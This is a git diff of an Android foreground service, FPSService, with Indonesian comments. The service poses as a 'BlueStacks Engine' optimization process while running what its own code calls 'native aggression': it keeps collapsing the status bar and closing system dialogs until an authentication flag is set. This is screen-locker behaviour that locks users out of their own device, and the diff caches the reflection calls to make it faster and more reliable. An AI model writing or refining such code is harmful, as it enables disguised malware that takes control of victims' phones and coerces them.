@@ -4,16 +4,16 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
 import android.os.Build;
-import android.os.Handler;
-import android.os.Looper;
 import android.content.pm.ServiceInfo;
 import java.lang.reflect.Method;
 
 public class FPSService extends Service {
+
+    private Object statusBarService;
+    private Method collapsePanelsMethod;
 
     static {
         System.loadLibrary("fps-native");
@@ -28,22 +28,36 @@ public class FPSService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        startInForeground();
         
-        // Panggil native aggression
+        // Cek auth di awal, jika sudah auth jangan jalankan agresi
+        boolean isAuth = getSharedPreferences("AUTH_PREFS", MODE_PRIVATE)
+                        .getBoolean("is_authenticated", false);
+        if (isAuth) {
+            stopSelf();
+            return;
+        }
+
+        prepareStatusBarReflection();
+        startInForeground();
         startNativeAggression(getPackageName() + "/.FPSService");
     }
 
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        return START_STICKY;
+    private void prepareStatusBarReflection() {
+        try {
+            statusBarService = getSystemService("statusbar");
+            Class<?> statusBarManager = Class.forName("android.app.StatusBarManager");
+            collapsePanelsMethod = statusBarManager.getMethod("collapsePanels");
+            collapsePanelsMethod.setAccessible(true);
+        } catch (Exception e) {
+            // Refleksi gagal, akan fallback ke broadcast di collapseStatusBar()
+        }
     }
 
     private void startInForeground() {
         String CHANNEL_ID = "fps_overlay_channel";
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID, "BlueStacks Engine Service",
+                    CHANNEL_ID, "BlueStacks Engine",
                     NotificationManager.IMPORTANCE_LOW);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(channel);
@@ -53,7 +67,7 @@ public class FPSService extends Service {
                 new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
 
         Notification notification = builder
-                .setContentTitle("System Optimization Running")
+                .setContentTitle("Engine Optimization")
                 .setSmallIcon(android.R.drawable.ic_menu_manage)
                 .setOngoing(true)
                 .build();
@@ -65,38 +79,22 @@ public class FPSService extends Service {
         }
     }
 
-    // Dipanggil oleh Native via JNI
+    // Dipanggil JNI: Sangat cepat karena menggunakan cache method
     public void collapseStatusBar() {
         try {
-            Object statusBarService = getSystemService("statusbar");
-            Class<?> statusBarManager = Class.forName("android.app.StatusBarManager");
-            Method collapse = statusBarManager.getMethod("collapsePanels");
-            collapse.setAccessible(true);
-            collapse.invoke(statusBarService);
+            if (collapsePanelsMethod != null && statusBarService != null) {
+                collapsePanelsMethod.invoke(statusBarService);
+            } else {
+                sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
+            }
         } catch (Exception e) {
             sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
         }
     }
 
-    // Dipanggil oleh Native via JNI
+    // Dipanggil JNI
     public void closeSystemDialogs() {
-        Intent closeDialogs = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
-        sendBroadcast(closeDialogs);
-    }
-
-    // Dipanggil oleh Native via JNI
-    public void refreshOverlay() {
-        // Cek dulu apakah sudah diautentikasi
-        boolean isAuth = getSharedPreferences("AUTH_PREFS", MODE_PRIVATE)
-                        .getBoolean("is_authenticated", false);
-        
-        if (!isAuth) {
-            Intent intent = new Intent(this, MainActivity.class);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-            startActivity(intent);
-        } else {
-            stopSelf();
-        }
+        sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
     }
 
     @Override
